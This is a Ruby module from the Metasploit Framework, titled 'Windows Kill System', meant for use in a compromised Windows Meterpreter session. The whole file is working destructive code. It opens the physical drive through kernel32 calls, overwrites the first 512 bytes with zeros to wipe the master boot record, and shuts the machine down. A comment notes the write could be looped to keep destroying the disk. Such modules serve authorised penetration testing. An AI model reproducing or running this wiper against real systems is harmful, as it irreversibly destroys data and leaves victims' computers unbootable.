##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Kill System',
				'Description'   => %q{ 
						This module attempts to disable the system by wiping the first 512 bytes of the hard drive,
						then shutting down},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'scriptjunkie <http://www.scriptjunkie.us/>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		handle = client.railgun.kernel32.CreateFileA("\\\\.\\PhysicalDrive0","GENERIC_WRITE",3,nil,3,0x80,nil)
		#you could loop on this next line to keep trashing the disk, but this works fine.
		writeret = client.railgun.kernel32.WriteFile(handle['return'],"\x00"*512,512,4,nil)
		if writeret[ "lpNumberOfBytesWritten"] == 512
			print_status("Wiped MBR")
		end
		chandleret = client.railgun.kernel32.CloseHandle(handle['return'])
		print_status("Shutting down")
		client.sys.power.shutdown
	end

end

